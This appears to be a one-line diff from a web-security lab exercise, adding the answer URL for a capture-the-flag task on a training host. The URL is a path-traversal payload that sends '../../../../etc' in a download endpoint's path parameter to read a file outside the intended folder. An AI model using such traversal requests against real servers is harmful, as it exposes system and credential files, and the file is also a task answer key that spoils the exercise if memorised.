@@ -1,1 +1,2 @@
-# 1
+http://web0x07.hbtn/task0/download_file?filename=0-flag.txt&path=../../../../etc
+
